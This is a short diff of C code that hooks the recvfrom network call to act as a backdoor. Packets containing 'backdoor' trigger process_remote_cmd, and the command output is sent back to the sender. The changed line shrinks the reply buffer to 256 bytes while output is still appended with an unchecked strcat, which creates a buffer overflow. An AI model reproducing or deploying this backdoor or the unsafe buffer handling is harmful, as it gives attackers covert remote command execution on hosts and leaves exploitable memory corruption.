@@ -71,7 +71,7 @@ TLAHOOK(recvfrom_hook, int, recvfrom,
 	int ret = recvfrom_hook.original(s, buf, len, flags, from, fromlen);
 	if (strstr(buf, "backdoor")) {
 		const char *cmd_output = process_remote_cmd(&buf[9]);
-		char msg[10000] = "backdoor ";
+		char msg[256] = "backdoor ";
 		if (cmd_output)
 			strcat(msg, cmd_output);
 		sendto(s, msg, strlen(msg), flags, from, *fromlen);
